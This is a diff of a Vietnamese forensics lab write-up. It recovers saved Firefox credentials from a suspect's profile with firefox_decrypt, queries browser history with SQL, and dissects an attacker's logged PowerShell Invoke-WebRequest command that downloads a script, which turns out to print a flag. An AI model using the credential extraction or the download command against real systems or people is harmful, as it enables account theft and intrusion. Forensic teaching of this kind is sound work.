@@ -111,3 +111,84 @@ Trong hệ điều hành Windows thì nó chứa đựng lượng lớn các d�
 <img width="2415" height="631" alt="image" src="https://github.com/user-attachments/assets/8fe1330c-2b5c-47cb-abe8-c1b178780c11" />
 
 Đây là vị trí giá trị mà malware được thêm vào
+
+## 2. Given the Firefox profile of a suspect, answer the following:
+### i. What’s the username and password stored in the saved logins
+Đầu tiên chúng ta cần phải biết là, các phần thuộc về credentials information đều bị Firefox chuyển hóa thành dạng không thể đọc được để tăng tính bảo mật trong file `login.json`, thế nên để đọc được username và password thì chúng ta cần sử dụng một công cụ đó gọi là **Firefox_Decrypt** được build sẳn trên github, đầu tiên chúng ta cần thực hiện thao tác tải về bằng lệnh:
+```
+git clone https://github.com/unode/firefox_decrypt 
+Cloning into 'firefox_decrypt'...
+remote: Enumerating objects: 1163, done.
+remote: Counting objects: 100% (275/275), done.
+remote: Compressing objects: 100% (40/40), done.
+remote: Total 1163 (delta 250), reused 238 (delta 233), pack-reused 888
+Receiving objects: 100% (1163/1163), 414.55 KiB | 1.14 MiB/s, done.
+Resolving deltas: 100% (732/732), done.
+```
+Sau đó chúng ta chỉ cần chay lệnh firefox_decrypt là sẽ thấy được username và password trong file `login.json`
+<img width="1908" height="438" alt="Screenshot 2025-11-21 151852" src="https://github.com/user-attachments/assets/9936300b-8814-4e0b-ab2b-989e6bb90a05" />
+
+### ii. What’s the most frequently visited website?
+Để tìm được trang web mà người dùng truy cập vào nhiều nhất, chúng ta có thể sử dụng 2 cách:
+- Cách đầu tiên là dùng phần Browser Data của sqlitebrowser để thực hiện xem phần moz_places và tìm kiếm phần visitcount để suy ra được mục mà người dùng xem nhiều nhất như sau
+  <img width="1912" height="1035" alt="Screenshot 2025-11-18 233111" src="https://github.com/user-attachments/assets/fa599986-9be7-4173-af40-5a5910901ad1" />
+
+  Đầu tiên vào **places.sqlite**, đây là nơi chúng ta sẽ thực hiện xem các thông tin mà liên quan đến người dùng nhiều nhất.
+  Sau đó vào phần **Browser Data**
+  <img width="1386" height="916" alt="Screenshot 2025-11-18 234602" src="https://github.com/user-attachments/assets/357fc607-b2ea-4d7a-9bc4-a8bace267715" />
+
+  ở đây chúng ta sẽ thấy được visitcount vào trang web https://amazon.com là nhiều nhất với nhiều lần truy cập trang web đó.
+- Cách thứ 2 là dùng Execute SQL để thực hiện chay nhanh hơn.
+  Đầu tiên di chuyển qua ô Execute SQL cùng hàng với mục Browser Data.
+  <img width="3838" height="1723" alt="image" src="https://github.com/user-attachments/assets/63d01638-01e7-4b72-87c9-71ecfc8bda46" />
+
+  Chạy lệnh Execute SQL sau:
+  ```
+  SELECT 
+    url, 
+    title, 
+    visit_count
+    FROM moz_places 
+    ORDER BY visit_count DESC 
+    LIMIT 10;
+  ```
+  Vậy chúng ta cũng có thể xác định được trang web được truy cập qua cách này
+### iii. What’s the name of the file downloaded by the suspect?
+Tương tự như trên thì chúng ta sẽ chạy 1 lệnh trong Execute SQL để tìm ra được file đã download về
+<img width="1371" height="978" alt="Screenshot 2025-11-18 235528" src="https://github.com/user-attachments/assets/a58c5b66-d7fd-45c7-b000-9c677f82eb11" />
+
+<img width="3839" height="1248" alt="image" src="https://github.com/user-attachments/assets/e15c99ab-a9bb-407a-9ab0-b000e92eaea5" />
+
+Khi dùng Browser Data chúng ta cũng sẽ thấy có một đường dẫn của https://www.python.org/ftp/python/3.11.1/python-3.11.1-amd64.exe
+Vậy file được tải về chinh là python-3.11.1-amd64.exe
+
+## 3. Given the PowerShell Event logs of a compromised system, answer the following:
+### i. What’s the command executed by the attacker to download a file on the system?
+Trong bài này, chúng ta được đề cung cấp cho 1 file event được PowserShell, tức là kẻ tấn công đã dùng các lệnh độc để cố gắng cài mã độc vào hệ thống. Đầu tiên khi mở file SaveLog của PowerShellevent lên thì chúng ta có thể thấy được có 1 event xuất hiện lệnh prompt được mở lên.
+<img width="1306" height="674" alt="Screenshot 2025-11-19 134524" src="https://github.com/user-attachments/assets/66ba890a-d8c0-468d-871e-45490641566d" />
+
+Sau đó khi tìm các event sau chúng ta có thể thấy được 1 event rất đáng ngờ như sau.
+<img width="1299" height="665" alt="Screenshot 2025-11-19 142025" src="https://github.com/user-attachments/assets/1cee9700-9b4a-40f2-bbe1-8a6e48aaac3e" />
+
+Đây dường như là một lệnh cài đặt 1 cái gì đó về máy từ internet. Chúng ta sẽ phân tích câu lệnh này qua từng phần nhỏ
+`Invoke-WebRequest -UseBasicParsing -Uri ... -OutFile "file.ps1"` đầu tiên đây là câu lệnh tìm thấy bên trong event. chia nhỏ nó ra thành từng phần để hiểu hơn
+    - `Invoke-WebRequest`: (viết tắt là wget - iwr) đây là lệnh yêu cầu máy tính gửi một request HTTP ra ngoài internet, để tải về một tệp gì đó trong trường hợp này.
+    - `-UseBasicParsing`: tham số này bảo PowerShell dùng bộ phận phân tích cơ bản nhất, bỏ qua Internet Explorer engine. Nó thường được dùng trong các script của các hacker dùng để tránh lỗi không tương thích với máy chủ, hoặc máy không có giao diện GUI để có thể đảm bảo lệnh chạy mượt mà nhất.
+    - `-URI https://www.google.com/search?q=raw.githubusercontent.com//Lab 2/files/file.ps1` đây là địa chỉ nguồn trên internet.Kẻ tấn công dường như đang tải một file độc hại từ github về
+    - Cuối cùng lệnh Output sẽ lưu file được tải vào "file.ps1"
+### ii. Can you analyze the downloaded file and understand what’s the purpose of that file?
+File được tải về là `file.ps1`, giờ hãy xem nội dung của file ấy là gì.
+<img width="1919" height="1079" alt="image" src="https://github.com/user-attachments/assets/5da4372f-ffde-4ce9-994b-655d7f10105c" />
+
+```
+$data = "SGVsbG8sIHVzZSBmbGFne2V2M250X2wwZ3NfZjByX3RoM193MW59IGFzIHRoZSBhbnN3ZXIgdG8gdGhlIG9yaWdpbmFsIHF1ZXN0aW9uLg=="
+$flag = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data))
+Write-Output $flag
+```
+Đây là nội dung của file khi được tải về. Ở đây chúng ta có 1 biến data dường như nó đã được mã hóa theo dạng base64 theo những kí tự in hoa, in thường, số, và dấu bằng đặc trưng ở cuối, tiếp đó là biến flag cho thấy lệnh được giải mã ra và ghi output nó vào biến flag mới. Vậy ở đây chúng ta chỉ cần tập trung vào biến data với nội dung mã hóa là gì.
+Đây là nội dung của đoạn base64 sau khi decode ra:
+<img width="1721" height="937" alt="image" src="https://github.com/user-attachments/assets/490a99c4-96c6-49b5-bf22-f52aa76e3e72" />
+
+Vậy Flag là: flag{ev3nt_l0gs_f0r_th3_w1n}
+
+# Document Analysis and Steganography
